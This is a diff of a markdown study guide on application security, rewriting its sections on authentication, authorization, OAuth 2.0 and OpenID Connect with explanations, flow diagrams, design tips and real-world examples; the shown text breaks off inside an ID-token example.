@@ -1,14 +1,6 @@
-﻿# 10. Security
+# 10. Security
 
 [<- Back to master index](../README.md)
-
----
-
-## Overview
-
-System security protects users, data, and services across the full stack — from proving identity and controlling access, to encrypting sensitive information and defending against common attacks.
-
-Production designs layer these controls: authentication and authorization, encryption and secret management, protections against web vulnerabilities, perimeter defenses, and audit logging. **Zero Trust** treats every request as untrusted until verified, even inside the network.
 
 ---
 
@@ -42,28 +34,45 @@ Production designs layer these controls: authentication and authorization, encry
 
 ## 10.1 Authentication
 
-### What is authentication?
+### Overview
 
-**Authentication** is the process of verifying the identity of a user, service, or device.
+Picture the front desk at an office building. Before you reach your floor, someone checks your ID and confirms you are who you claim to be. **Authentication** is that check for software — proving identity before the system decides what you may do.
 
-**Question:** Who are you?
+Technically, authentication verifies the identity of a user, service, or device. It answers **who are you?** using credentials such as passwords, one-time codes, biometrics, API keys, or signed tokens. Authentication always runs **before** authorization; you must establish identity before permission checks make sense.
 
-**Examples:**
+---
 
-- Username + password
-- OTP
-- Biometric authentication
-- Social login (Google, GitHub)
-- API keys
-- JWT tokens
+### What problem it fixes
 
-Authentication happens **before** authorization.
+HTTP and most APIs are stateless — each request arrives without built-in memory of who sent it. Without authentication, every endpoint would be anonymous or would rely on guessable identifiers.
 
-```text
-User logs in with email/password → system verifies credentials → user is authenticated
-```
+Common failures authentication addresses:
 
-### Authentication vs authorization
+- **Impersonation** — anyone could claim to be any user without proof.
+- **Credential theft** — plaintext password storage turns a database leak into full account compromise.
+- **Weak single-factor login** — password-only accounts fall to phishing and credential stuffing.
+- **Unverified services** — microservices cannot tell legitimate callers from attackers on the network.
+
+Authentication establishes a trusted identity that downstream authorization, auditing, and rate limiting can attach to.
+
+---
+
+### What it does
+
+Authentication supports a small set of outcomes:
+
+1. **Verify identity** — confirm the principal matches stored or issued credentials.
+2. **Issue proof of identity** — return a session ID, JWT, or similar artifact the client presents on later requests.
+3. **Reject invalid attempts** — fail closed on bad passwords, expired tokens, or missing credentials.
+4. **Optionally step up trust** — MFA adds a second factor after the first succeeds.
+
+It does **not** decide which files, APIs, or records the principal may access — that is authorization.
+
+---
+
+### How it works — the architecture inside
+
+#### Authentication vs authorization
 
 | | Authentication | Authorization |
 |---|----------------|---------------|
@@ -71,263 +80,151 @@ User logs in with email/password → system verifies credentials → user is aut
 | **Question** | Who are you? | What can you do? |
 
 ```text
-User login → authentication success → authorization check → access resource
+Login → authentication success → authorization check → access resource or deny
 ```
 
-**Example — admin user:**
+#### Password-based authentication
+
+Passwords are never stored in plaintext. Registration hashes the password; login hashes the entered value and compares.
 
 ```text
-Authentication: ✓ user identity verified
-Authorization:  ✓ can delete users
+Registration: password → hash function (+ salt) → stored hash
+Login:        entered password → hash (+ same salt) → compare with stored hash
 ```
-
-### Authentication flow
-
-```text
-User → login request → Auth service → verify credentials → Database → valid user? → Auth service → generate token → User
-```
-
-### Password-based authentication
-
-```text
-1. User enters password
-2. Password hashed
-3. Compare with stored hash
-4. Login success or failure
-```
-
-**Never store plain-text passwords.**
 
 | Bad | Good |
 |-----|------|
-| `password = "welcome123"` | `password_hash = bcrypt(password)` |
+| `password = "welcome123"` | `password_hash = bcrypt(password, salt)` |
 
-**Common algorithms:** BCrypt · Argon2 · PBKDF2
+**Preferred algorithms:** BCrypt, Argon2, PBKDF2. **Avoid:** MD5, SHA1 alone (too fast; rainbow tables).
 
-**Avoid:** MD5 · SHA1
+**Salting** adds a per-user random value before hashing so identical passwords produce different hashes and rainbow tables fail.
 
-### Password hashing
+#### Session-based vs token-based
 
-Protects passwords if the database leaks.
-
-```text
-Password: welcome123
-Stored:   $2a$10$abcdxyz...
-```
-
-**Registration:**
+| | Session-based | Token-based (e.g. JWT) |
+|---|---------------|------------------------|
+| **State** | Server stores session | Client carries signed token |
+| **Client carries** | Session ID in cookie | `Authorization: Bearer <token>` |
+| **Trade-off** | Easy logout; needs shared store to scale | Stateless verification; harder instant revocation |
 
 ```text
-Password → hash function → hash stored
+Session: login → server creates session → Set-Cookie → server lookup each request
+Token:   login → issue JWT → Bearer header each request → verify signature
 ```
 
-**Login:**
+#### Other mechanisms
 
-```text
-Entered password → hash again → compare hashes
-```
+| Mechanism | Typical use |
+|-----------|-------------|
+| **MFA / OTP** | Password + SMS, TOTP app, or hardware key |
+| **Social / delegated login** | OAuth 2.0 + OpenID Connect (see 10.3, 10.4) |
+| **API keys** | Service integrations, internal APIs |
+| **mTLS** | Service-to-service; both sides present certificates |
+| **SSO** | One login across many apps via central IdP |
 
-### Salting
-
-**Salt** = random value added before hashing.
-
-**Without salt:** same password → same hash for everyone (rainbow tables work).
-
-**With salt:** `password + randomSalt` → unique hash per user.
-
-```text
-User A: password + salt1 → hash A
-User B: password + salt2 → hash B
-```
-
-**Benefits:** prevents rainbow table attacks; makes cracking harder.
-
-### Session-based vs token-based authentication
-
-| | Session-based | Token-based |
-|---|---------------|-------------|
-| **State** | Server stores session | Token sent each request |
-| **Client carries** | Session ID (cookie) | Bearer token (often JWT) |
-| **Trade-off** | Easy logout; harder to scale | Stateless; revocation harder |
-
-```text
-Session:  login → server creates session → cookie → server lookup on each request
-Token:    login → issue token → Authorization: Bearer <token> on each request
-```
-
-JWT structure, refresh tokens, and session scaling are covered in **JWT** and **Session Management** below.
-
-### Multi-factor authentication (MFA)
-
-Requires multiple verification methods.
+#### MFA factors
 
 | Factor | Examples |
 |--------|----------|
-| Something you **know** | Password |
-| Something you **have** | Phone, security key |
+| Something you **know** | Password, PIN |
+| Something you **have** | Phone, YubiKey |
 | Something you **are** | Fingerprint, Face ID |
 
-**Example:** password + OTP
-
-**Benefit:** stronger security.
-
-### OTP authentication
-
-**One-Time Password** flow:
+#### High-level architecture
 
 ```text
-User login → generate OTP → send SMS/email → user enters OTP → verify OTP
+Client → API Gateway → Auth Service → User DB (+ Token/Session Store)
+After login: Client → JWT or session cookie → Gateway → Microservices
 ```
 
-**Best practices:**
-
-- Expire quickly
-- Single use
-- Rate limit retries
-
-### Social and delegated login
-
-Login via third-party providers (Google, GitHub) uses **OAuth 2.0** for delegated access and **OpenID Connect** for identity — covered in the following sections.
-
-### API key authentication
-
-Used for service-to-service or third-party API access.
-
-```http
-GET /users
-x-api-key: abc123xyz
+```mermaid
+flowchart LR
+    User[User] --> Login[Login request]
+    Login --> Auth[Auth service]
+    Auth --> Verify{Credentials valid?}
+    Verify -->|No| Reject[401 rejected]
+    Verify -->|Yes| Issue[Issue session or token]
+    Issue --> Client[Client stores proof]
+    Client --> API[Subsequent API calls]
+    API --> AuthCheck[Validate session or JWT]
+    AuthCheck --> Allow[Authenticated request]
 ```
 
-| Advantages | Disadvantages |
-|------------|---------------|
-| Simple | Less secure |
-| | Hard to manage at scale |
+---
 
-**Used for:** internal APIs, third-party integrations.
+### Pitfalls and design tips
 
-### Service-to-service authentication
+- **Never store plaintext passwords** — use Argon2id or BCrypt with a unique salt per user.
+- **Rate-limit login endpoints** — slow brute force and credential-stuffing attacks.
+- **Prefer short-lived access tokens** plus refresh tokens over long-lived bearer tokens in browsers.
+- **Secure cookies when using sessions** — `HttpOnly`, `Secure`, `SameSite=Lax` or `Strict`.
+- **Do not confuse authentication with authorization** — a valid login does not imply admin rights.
+- **API keys are identifiers, not strong auth** — rotate them, scope them, and prefer OAuth client credentials or mTLS for service-to-service.
+- **Regenerate session ID after login** — prevents session fixation.
+- **Default for new web apps:** OIDC social login or email/password + MFA for sensitive apps; JWT or session with Redis for API scale.
 
-```text
-Microservice A → Microservice B
-```
+---
 
-**Methods:** JWT · OAuth client credentials · mutual TLS (mTLS) · API keys
+### Real-world example
 
-**Preferred:** JWT or mTLS.
+**GitHub sign-in with password and TOTP**
 
-### Mutual TLS (mTLS)
+1. User submits username and password to `github.com/login`.
+2. GitHub verifies the password against a salted hash (BCrypt-style storage).
+3. If MFA is enabled, GitHub prompts for a TOTP code from an authenticator app.
+4. On success, GitHub creates a **session** (session cookie) and optionally issues device-trust cookies.
+5. Subsequent requests send the session cookie; GitHub's edge validates the session before serving repos or settings.
+6. Logout destroys the server-side session — immediate revocation, which is harder with long-lived JWTs alone.
 
-Both client and server verify identities.
-
-| | Normal TLS | mTLS |
-|---|------------|------|
-| **Server** | Authenticated | Authenticated |
-| **Client** | Not authenticated | Authenticated |
-
-```text
-Client certificate → server validation → secure communication
-```
-
-**Common in:** banking, internal microservices.
-
-### Single sign-on (SSO)
-
-Login once, access multiple applications.
-
-```text
-Company portal → login once → email, HR system, payroll, wiki
-```
-
-**Benefits:** better UX; centralized authentication.
-
-### Authentication server
-
-Dedicated service for login.
-
-**Responsibilities:**
-
-- User login
-- Token generation
-- Password reset
-- MFA verification
-
-**Benefits:** centralized security; easier maintenance.
-
-### Security best practices
-
-- Use HTTPS
-- Hash passwords (BCrypt/Argon2)
-- Use MFA
-- Use short-lived access tokens
-- Rotate secrets
-- Encrypt sensitive data
-- Rate limit login APIs
-- Monitor suspicious activity
-- Use refresh tokens
-- Secure cookies (HttpOnly, Secure, SameSite)
-
-### High-level authentication architecture
-
-```text
-Client → API Gateway → Auth Service → User DB + Token Store
-```
-
-**After authentication:**
-
-```text
-Client → JWT → API Gateway → Microservices → Databases
-```
-
-### Summary
-
-```text
-Authentication = verify identity ("who are you?") — always before authorization
-Passwords: hash + salt (BCrypt/Argon2); never store plaintext
-Mechanisms: sessions, JWT/tokens, MFA, API keys, mTLS, SSO — OAuth/OIDC/JWT/sessions detailed below
-```
+This shows password hashing, optional MFA, and session-based proof of identity in a production system millions of users rely on.
 
 ---
 
 ## 10.2 Authorization
 
-### What is authorization?
+### Overview
 
-**Authorization** is the process of determining what an **authenticated** user, service, or system is allowed to do.
+After the building guard confirms your ID, a separate system decides which floors and rooms your badge opens. **Authorization** is that second step — once identity is known, what is this principal allowed to do?
 
-**Question:** What can you do?
+Technically, authorization evaluates permissions, roles, policies, or ownership rules for an **already authenticated** user, service, or system. It answers **what can you do?** or **what can you access?** and returns allow or deny before business logic runs.
 
-**Examples:**
+---
 
-- Read a document
-- Update a profile
-- Delete a user
-- Access an API
-- View financial reports
+### What problem it fixes
 
-Authorization happens **after** authentication.
+Knowing who someone is does not tell you whether they may delete a user, read a payroll file, or call `DELETE /orders/123`.
+
+Without authorization:
+
+- **Over-privileged access** — any logged-in user could reach admin APIs.
+- **Horizontal privilege escalation** — user A reads user B's data by guessing IDs.
+- **Inconsistent rules** — each microservice invents its own checks; gaps appear at boundaries.
+- **Audit gaps** — no structured model of who was allowed to perform sensitive actions.
+
+Authorization centralizes or standardizes **access decisions** so they are explicit, testable, and enforceable.
+
+---
+
+### What it does
+
+Authorization maps an authenticated principal plus a requested action on a resource to **allow** or **deny**:
+
+- **Permissions** — atomic actions such as `READ_USER`, `DELETE_ORDER`.
+- **Roles** — named bundles of permissions (`ADMIN`, `MANAGER`).
+- **Policies** — rules evaluated by a policy engine (see RBAC and ABAC in 10.7, 10.8).
+- **Resource rules** — ownership, ACL entries, or attribute matches.
+
+It does **not** verify passwords or issue tokens — it consumes identity from authentication and optional claims in JWTs or session data.
+
+---
+
+### How it works — the architecture inside
+
+#### Request flow
 
 ```text
-User login → authentication success → authorization check → access granted or denied
-```
-
-### Authentication vs authorization
-
-| | Authentication | Authorization |
-|---|----------------|---------------|
-| **Verifies** | Identity | Permissions |
-| **Question** | Who are you? | What can you access? |
-
-**Example — user John:**
-
-```text
-Authentication: ✓ identity verified
-Authorization:  ✓ can read reports  |  ✗ cannot delete users
-```
-
-### Authorization flow
-
-```text
-User request → authentication check → authorization check → access granted or denied
+Request → authentication check → authorization check → handler or 403 Forbidden
 ```
 
 **Example:**
@@ -337,103 +234,33 @@ DELETE /users/101
 ```
 
 ```text
-1. User authenticated?
-2. User has DELETE_USER permission?
-
-Both true → access granted
+1. Is the caller authenticated?
+2. Does the caller have DELETE_USER (or own the resource)?
+Both yes → allow; otherwise → deny
 ```
 
-### Permissions
+#### Common models
 
-A **permission** is an allowed action.
-
-**Examples:** `READ_USER` · `CREATE_USER` · `UPDATE_USER` · `DELETE_USER` · `VIEW_REPORTS` · `EXPORT_DATA`
-
-A user may have one or many permissions.
-
-### Roles
-
-A **role** is a collection of permissions.
+| Model | Idea | Best for |
+|-------|------|----------|
+| **RBAC** | User → role → permissions | Admin panels, stable org roles |
+| **ABAC** | User + resource + environment attributes | Context rules, compliance |
+| **ACL** | Per-resource list of who may do what | Documents, object storage |
+| **Resource ownership** | Owner may edit; others may not | Social posts, drive files |
 
 ```text
-ADMIN
- ├── READ_USER
- ├── CREATE_USER
- ├── UPDATE_USER
- └── DELETE_USER
-
-MANAGER
- ├── READ_USER
- └── VIEW_REPORTS
-
-USER
- └── READ_PROFILE
-```
-
-**Benefits:** easier permission management; reduces complexity.
-
-RBAC (role → permissions) and ABAC (attribute policies) are the two main models — each has a dedicated section below.
-
-### Resource-based authorization
-
-Authorization based on **ownership** of a resource.
-
-```text
-Document owner: User A
-Request: DELETE document
-
-Owner       → ✓ allowed
-Other users → ✗ denied
-```
-
-**Used in:** Google Drive, Dropbox, social media posts.
-
-### Policy-based authorization
-
-Permissions defined using **policies** evaluated by a policy engine.
-
-```text
-Policy: allow if role = ADMIN
-Policy: allow if user owns resource
-
-Policy engine → ALLOW or DENY
-```
-
-**Benefits:** flexible; centralized management.
-
-### Access control list (ACL)
-
-Each resource contains a list of allowed users or groups.
-
-```text
-Document A ACL:
+ACL example — Document A:
   User1 → read
   User2 → read, write
   User3 → read, write, delete
-
-Request → check ACL → allow or deny
 ```
 
-### Access matrix
+#### Authorization via JWT claims
 
-Permissions in matrix form:
-
-```text
-                Resource
-          File1   File2   File3
-UserA      RW      R       -
-UserB      R       RW      RW
-UserC      -       R       R
-
-R = read   W = write
-```
-
-### Authorization using JWT
-
-Roles or permissions may be stored in JWT claims.
+Roles or permissions may be embedded at login time:
 
 ```json
-{ "userId": 101, "role": "ADMIN" }
+{ "sub": "101", "role": "ADMIN" }
 ```
 
 or
@@ -442,1226 +269,702 @@ or
 { "permissions": ["READ_USER", "DELETE_USER"] }
 ```
 
-**Flow:**
-
 ```text
-Receive JWT → validate JWT → extract role/permissions → authorize request
+Receive JWT → validate signature and expiry → extract claims → check required permission
 ```
 
-### API authorization
+**Trade-off:** embedding permissions in JWT speeds checks but stale claims persist until token expiry unless you add versioning or introspection.
 
-Protect APIs with permissions.
+#### API endpoint mapping
 
-| Endpoint | Permission |
-|----------|------------|
+| Endpoint | Required permission |
+|----------|---------------------|
 | `GET /users` | `READ_USER` |
 | `POST /users` | `CREATE_USER` |
 | `DELETE /users/{id}` | `DELETE_USER` |
 
-```text
-Request → authentication → permission check → allow or deny
-```
-
-### Microservice authorization
-
-Each service may perform its own authorization checks.
-
-```text
-User → API gateway → order service → payment service
-```
-
-Authorization info travels via tokens or service metadata.
-
-**Common approaches:** JWT claims · OAuth scopes · policy engines
-
-### OAuth scopes
-
-Scopes limit what a token may access (e.g. `read:user` allows `GET /users`, not `DELETE`). Full OAuth scope model is in **OAuth2** below.
-
-### Centralized vs decentralized authorization
+#### Centralized vs decentralized
 
 | | Centralized | Decentralized |
 |---|-------------|---------------|
-| **Model** | Dedicated authorization service + policy store | Each app/service owns its rules |
-| **Benefits** | Consistent rules; easier governance | Simpler architecture; lower dependency |
-| **Challenges** | Extra service to run | Rule duplication; inconsistent policies |
+| **Model** | Dedicated authz service + policy store | Each service owns rules |
+| **Benefits** | Consistent governance | Fewer moving parts |
+| **Challenges** | Extra hop and dependency | Duplicated, drifting policies |
+
+#### Caching permissions
 
 ```text
-Centralized:
-Application → authorization service → policy store
+Request → permission lookup → cache hit/miss → allow or deny
 ```
 
-### Authorization cache
+Cache role-to-permission mappings in Redis with TTL; invalidate on role changes. Stale cache is a common production bug after permission updates.
 
-Permissions are often cached for performance.
-
-```text
-User → permission lookup → cache hit → allow or deny
+```mermaid
+flowchart LR
+    Req[API request] --> AuthN{Authenticated?}
+    AuthN -->|No| Deny1[401]
+    AuthN -->|Yes| AuthZ[Authorization check]
+    AuthZ --> Policy[RBAC / ABAC / ACL / ownership]
+    Policy --> Decision{Allowed?}
+    Decision -->|Yes| Handler[Business logic]
+    Decision -->|No| Deny2[403 Forbidden]
 ```
 
-| Benefits | Challenges |
-|----------|------------|
-| Faster authorization | Cache invalidation |
-| Reduced database load | Stale permissions after updates |
+---
 
-### High-level authorization architecture
+### Pitfalls and design tips
 
-```text
-Client → API Gateway → Auth Service → Authorization Service → Policy Store + User Store → ALLOW or DENY
-```
+- **Check authorization on the server** — never rely on UI hiding buttons; clients can call any API.
+- **Validate resource ownership** — `GET /orders/123` must confirm the caller owns or may access order 123, not only that they are logged in.
+- **Avoid giant permission lists in JWTs** — large claim sets bloat tokens; use roles or centralized policy lookup for fine-grained rights.
+- **Default deny** — explicit allow rules; missing policy means deny.
+- **Log denials** — repeated 403s on admin paths may indicate attack or misconfiguration.
+- **Interview angle:** authentication proves identity; authorization proves entitlement — always in that order.
 
-### Summary
+---
 
-```text
-Authorization = what an authenticated principal may do ("what can you do?")
-Models: RBAC, ABAC (dedicated sections), ACL, policies, resource ownership
-APIs: map endpoints to permissions; JWT claims and OAuth scopes carry authorization data
-```
+### Real-world example
+
+**Google Drive sharing**
+
+1. Alice authenticates with Google (OIDC — see 10.4).
+2. Alice opens `document/abc` and clicks Share; she sets Bob to **Viewer** and Carol to **Editor**.
+3. Drive stores an **ACL** on the file: Bob → read, Carol → read + write.
+4. Bob requests the file — authorization checks the ACL against Bob's authenticated `sub`; read allowed.
+5. Bob attempts to edit — ACL has no write for Bob → deny, even though he is logged in.
+6. Carol edits successfully — her ACL entry includes write.
+
+This combines authentication, resource-level ACLs, and role-like share levels in a widely used product.
 
 ---
 
 ## 10.3 OAuth2
 
-### What is OAuth 2.0?
+### Overview
 
-**OAuth 2.0** is an authorization framework that lets an application access resources on behalf of a user **without sharing the user's password**.
+Imagine lending a valet a key that starts the car and opens the trunk but cannot open your home garage. **OAuth 2.0** works the same way for apps — a user grants a third-party application **limited access** to resources (calendar, photos, profile) **without handing over their password**.
 
-**Question:** Can this application access the user's resources?
+Technically, OAuth 2.0 is an **authorization framework**, not an authentication protocol. It defines roles (resource owner, client, authorization server, resource server), token types (access, refresh), scopes, and standard grants so clients obtain bearer tokens the resource server validates.
 
-OAuth 2.0 focuses on **authorization**, not authentication.
+---
 
-```text
-Calendar app → needs Google Calendar access → user grants permission
-(no Google password shared with the calendar app)
-```
+### What problem it fixes
 
-### Why OAuth 2.0?
+Before OAuth, users often gave third-party apps their main account password. That creates:
 
-**Without OAuth:**
+- **Password exposure** — the app stores credentials it should never see.
+- **All-or-nothing access** — the app can do anything the user can do.
+- **No granular revocation** — changing password breaks the app but is a blunt instrument.
+- **No audit trail** — hard to see which app accessed what.
 
-```text
-User → shares password → third-party application
-```
+OAuth replaces password sharing with **delegated, scoped, revocable tokens** issued by a trusted authorization server after explicit user consent.
 
-**Problems:** password exposure · security risks · difficult access control · difficult revocation
+---
 
-**With OAuth:**
+### What it does
 
-```text
-User → approves access → authorization server → issues token → application uses token
-```
+OAuth 2.0 enables:
 
-**Benefits:** no password sharing · limited access · easy revocation · better security
+1. **User consent** — consent screen lists requested scopes; user approves or denies.
+2. **Access tokens** — short-lived bearer tokens sent on API calls (`Authorization: Bearer …`).
+3. **Refresh tokens** — long-lived secrets used only at the token endpoint to mint new access tokens.
+4. **Scope-limited access** — `read:calendar` does not imply `delete:calendar`.
+5. **Revocation** — tokens can be invalidated at the authorization server.
 
-### Key participants
+OAuth answers **can this client access these resources on behalf of this user?** — not **who is the user?** (that is OIDC, 10.4).
+
+---
+
+### How it works — the architecture inside
+
+#### Participants
 
 | Role | Description | Example |
 |------|-------------|---------|
-| **Resource owner** | User who owns the data | John owns Google Drive files |
-| **Client** | Application requesting access | Calendar app |
-| **Authorization server** | Verifies user; issues tokens | Google authorization server |
-| **Resource server** | Stores protected resources | Google Drive API |
+| **Resource owner** | User who owns the data | You and your Google Calendar |
+| **Client** | App requesting access | A meeting scheduler |
+| **Authorization server** | Issues tokens after consent | Google OAuth server |
+| **Resource server** | Hosts protected APIs | Google Calendar API |
 
-### High-level flow
+#### Authorization code grant (most common for web/mobile)
 
-```text
-User → client application → authorization server → user approval → authorization code → access token → resource server
-```
-
-### Access token
-
-Represents granted access.
-
-```http
-Authorization: Bearer eyJhbGciOi...
-```
-
-**Characteristics:**
-
-- Short-lived
-- Contains permissions (scopes)
-- Sent with every API request
-
-### Refresh token
-
-Used to obtain new access tokens when the access token expires.
+Browsers must not receive access tokens in URLs. The code flow uses an intermediate **authorization code** exchanged server-side.
 
 ```text
-Access token expired → refresh token → new access token
+1. Client redirects user to GET /oauth/authorize?client_id&scope&redirect_uri&state
+2. User authenticates and consents
+3. Authorization server redirects to redirect_uri?code=AUTH_CODE&state
+4. Client backend POST /oauth/token with code + client_secret
+5. Authorization server returns access_token (+ refresh_token)
+6. Client calls resource server with Bearer access_token
 ```
-
-**Benefits:** better user experience; reduced login frequency
-
-Typically **long-lived** and stored securely.
-
-### Scopes
-
-Scopes define permissions granted to the client.
-
-**Examples:** `read:user` · `write:user` · `read:orders` · `write:orders`
 
 ```text
-Application requests: read:user
-✓ Read user profile
-✗ Update user profile
+Why code, not token in browser?
+Authorization code → backend exchange → access token never exposed in browser history
 ```
 
-### Authorization code grant
+#### Other grants
 
-Most common OAuth flow — web and mobile applications.
+| Grant | Use case |
+|-------|----------|
+| **Client credentials** | Service-to-service; no user |
+| **Device code** | TVs, CLI, IoT with limited input |
+| **Refresh token** | Obtain new access token without re-login |
+
+**Client credentials flow:**
 
 ```text
-User → client → authorization server → user login → user consent → authorization code → client exchanges code → access token
+Service → client_id + client_secret → /oauth/token → access_token → API
 ```
 
-### Authorization code flow (steps)
+#### Token validation
 
 ```text
-Step 1: Client redirects user → GET /oauth/authorize
-Step 2: User authenticates
-Step 3: User grants permission
-Step 4: Authorization server returns authorization code
-Step 5: Client sends code to /oauth/token
-Step 6: Access token returned
+API → extract Bearer token → validate signature or introspect → check expiry and scopes → allow or deny
 ```
 
-### Why authorization code?
-
-An intermediate **code** is returned instead of the token directly in the browser.
-
-**Benefits:**
-
-- More secure
-- Tokens not exposed in browser URL
-- Supports server-side validation
+**Introspection** — resource server asks authorization server about opaque tokens:
 
 ```text
-Authorization code → backend exchange → access token
+POST /introspect token=… → { active: true, scope: "read:orders", exp: … }
 ```
 
-### Client credentials grant
-
-Service-to-service communication — **no user** involved.
-
-```text
-Order service → inventory service
-
-Service → client ID + client secret → authorization server → access token → API access
-```
-
-**Used in:** microservices · backend integrations · scheduled jobs
-
-### Client credentials flow
-
-```text
-Service A → send client credentials → authorization server → issue access token → call protected APIs
-```
-
-### Device authorization flow
-
-For devices with limited input — smart TVs, gaming consoles, IoT.
-
-```text
-Device displays code → user opens browser → logs in → approves device → access token issued
-```
-
-### Token validation
-
-When an API receives a token:
-
-```text
-Request → extract token → validate signature → check expiry → check scopes → allow or deny
-```
-
-### Token introspection
-
-Resource server asks the authorization server about token validity.
-
-```text
-API → token → authorization server → valid? expired? scopes? → response
-```
-
-Useful when tokens are **opaque** (not JWT).
-
-### Token revocation
-
-Terminate access when needed — user logout, account compromise, permission removal.
-
-```text
-Token → revocation endpoint → invalidated → future requests denied
-```
-
-### JWT in OAuth
-
-OAuth tokens may be opaque or **JWT**-formatted. JWT benefits for OAuth: self-contained claims, fast validation — see **JWT** section for structure and validation.
-
-### OAuth scopes in APIs
-
-```text
-Token scope: read:orders
-Allowed:     GET /orders
-Denied:      DELETE /orders
-
-Token scope: write:orders
-Allowed:     POST /orders, PUT /orders
-```
-
-### Consent screen
-
-User explicitly grants permissions.
-
-```text
-Application requests:
-  ✓ Read profile
-  ✓ Read contacts
-  ✓ Read calendar
-
-User approves → authorization granted
-```
-
-**Benefits:** transparency; user control
-
-### OAuth in microservices
-
-```text
-User → API gateway → OAuth access token → microservices
-```
-
-Microservices validate: signature · expiry · scopes · claims
-
-**Common components:** identity provider · authorization server · API gateway · resource servers
-
-### Common OAuth endpoints
+#### Standard endpoints
 
 | Endpoint | Purpose |
 |----------|---------|
-| **Authorization** | User login and consent |
-| **Token** | Issues tokens |
-| **Revocation** | Invalidates tokens |
-| **Introspection** | Checks token validity |
+| `/authorize` | Login + consent |
+| `/token` | Issue tokens |
+| `/revoke` | Invalidate tokens |
+| `/introspect` | Validate opaque tokens |
 
-### Example complete flow
-
-```text
-User → travel app → Google Calendar access → auth server login → grant permission → auth code → backend token exchange → access token → Calendar API → data returned
+```mermaid
+flowchart LR
+    User[Resource owner] --> Client[Client app]
+    Client --> AuthZ[Authorization server]
+    AuthZ --> Consent[Login and consent]
+    Consent --> Code[Authorization code]
+    Code --> TokenEP[Token endpoint]
+    TokenEP --> Access[Access token]
+    Access --> Resource[Resource server API]
+    Resource --> Data[Protected data]
 ```
 
-### Summary
+---
 
-```text
-OAuth 2.0 = delegated authorization without sharing passwords
-Key flows: authorization code (users), client credentials (services), device code (TV/IoT)
-Tokens: access (short) + refresh (long); scopes limit what client can do
-```
+### Pitfalls and design tips
+
+- **OAuth is not login** — using access tokens as session proof confuses authorization with identity; use OIDC ID tokens for authentication.
+- **Always validate `state`** — prevents CSRF on the redirect callback.
+- **Never expose client_secret in mobile or SPA binaries** — use PKCE for public clients instead of secrets.
+- **Prefer authorization code + PKCE** over implicit or password grants (deprecated patterns).
+- **Scope minimally** — request only scopes the feature needs; users trust smaller consent screens.
+- **Short access token TTL** — pair with refresh token rotation for compromise recovery.
+- **Production stacks:** Keycloak, Auth0, Okta, Google Identity — all implement the same grant shapes.
+
+---
+
+### Real-world example
+
+**A travel app adding Google Calendar events**
+
+1. User clicks "Connect Google Calendar" in the travel app (OAuth **client**).
+2. Browser redirects to `accounts.google.com/o/oauth2/v2/auth` with `scope=https://www.googleapis.com/auth/calendar.events` and `response_type=code`.
+3. User signs into Google and approves calendar access on the **consent screen**.
+4. Google redirects to the app's callback with an **authorization code**.
+5. The app's backend exchanges the code at Google's **token endpoint** for an **access token** and **refresh token** (server-side, with client secret).
+6. The app calls `https://www.googleapis.com/calendar/v3/calendars/primary/events` with `Authorization: Bearer <access_token>` to create events.
+7. When the access token expires, the backend uses the **refresh token** to obtain a new one without asking the user to log in again.
+
+Google's documented Calendar API uses exactly this OAuth 2.0 authorization code pattern.
 
 ---
 
 ## 10.4 OpenID Connect
 
-### What is OpenID Connect (OIDC)?
+### Overview
 
-**OpenID Connect (OIDC)** is an identity layer built on top of **OAuth 2.0**. It provides **authentication** using OAuth 2.0 infrastructure.
+OAuth tells an app *what it may access*; it does not standardize *who logged in*. **OpenID Connect (OIDC)** adds that missing piece — like upgrading a valet key to a driver's license that proves your name and photo, built on the same OAuth infrastructure.
 
-**Question:** Who is the user?
+Technically, OIDC is an **identity layer on top of OAuth 2.0**. It introduces the **ID token** (usually a JWT), standard claims (`sub`, `email`, `name`), the `openid` scope, discovery metadata, JWKS for signature verification, and the UserInfo endpoint so relying parties authenticate users without handling passwords.
+
+---
+
+### What problem it fixes
+
+Pure OAuth 2.0 returns an access token for APIs but does not tell the client **which user** authenticated in a portable, verifiable way. Apps invented ad hoc profile fetches and insecure shortcuts.
+
+OIDC fixes:
+
+- **Standard identity proof** — signed ID token with stable `sub` (subject).
+- **Interoperable social login** — "Sign in with Google/Microsoft/Apple" uses the same contract.
+- **SSO across apps** — one IdP session feeds many relying parties.
+- **Verifiable claims** — iss, aud, exp checks plus JWKS signature validation.
+
+---
+
+### What it does
+
+OIDC provides:
+
+| Artifact | Purpose |
+|----------|---------|
+| **ID token** | Proof of authentication; who the user is |
+| **Access token** | OAuth API access (unchanged from OAuth 2.0) |
+| **UserInfo** | Optional extra profile fields |
+| **Discovery document** | Machine-readable endpoints and capabilities |
+| **JWKS** | Public keys to verify ID token signatures |
+
+Adding scope `openid` switches an OAuth flow into an OIDC flow.
+
+---
+
+### How it works — the architecture inside
+
+#### OAuth vs OIDC
 
 | | OAuth 2.0 | OIDC |
 |---|-----------|------|
 | **Focus** | Authorization | Authentication |
 | **Question** | What can be accessed? | Who is the user? |
+| **Primary return** | Access token | ID token + access token |
 
-### Why OIDC?
-
-**OAuth 2.0** tells applications: what can this application access?
-
-**OIDC** tells applications: who is the user?
-
-**Example — Login with Google:**
-
-Application needs:
-
-- User identity
-- User profile
-- User email
-
-OIDC provides this information.
-
-### OAuth vs OIDC
-
-| | OAuth 2.0 | OIDC |
-|---|-----------|------|
-| **Purpose** | Authorization | Authentication |
-| **Question** | What can be accessed? | Who is the user? |
-| **Returns** | Access token | ID token + access token |
-
-### Common example
-
-User clicks **Login with Google**:
+#### Authorization code flow with OIDC
 
 ```text
-User → Google login → authentication → ID token returned → application identifies user
+User → client → IdP login → consent (openid profile email) → authorization code
+→ backend token exchange → id_token + access_token + refresh_token
 ```
 
-**Without OIDC:** application receives access permission only.
-
-**With OIDC:** application receives user identity.
-
-### Key participants
-
-| Role | Description |
-|------|-------------|
-| **End user** | Actual user |
-| **Client** | Application requesting login |
-| **Identity provider (IdP)** | Authenticates users — Google, Microsoft, Okta, Keycloak |
-| **Resource server** | Provides protected APIs |
-
-### Identity provider (IdP)
-
-Central authentication system.
-
-**Responsibilities:**
-
-- User login
-- Password verification
-- MFA verification
-- ID token generation
-- User information management
-
-```text
-User → Google → identity verified → ID token issued
-```
-
-### High-level OIDC flow
-
-```text
-User → application → identity provider → user login → authorization code → ID token + access token → application
-```
-
-### ID token
-
-Most important OIDC concept — information about the authenticated user.
-
-Usually implemented as **JWT**:
-
-```text
-Header.Payload.Signature
-```
-
-### ID token content
-
-**Example payload:**
+#### ID token payload (example)
 
 ```json
 {
   "sub": "12345",
   "name": "John Doe",
   "email": "john@example.com",
-  "iss": "https://idp.com",
-  "aud": "client-app",
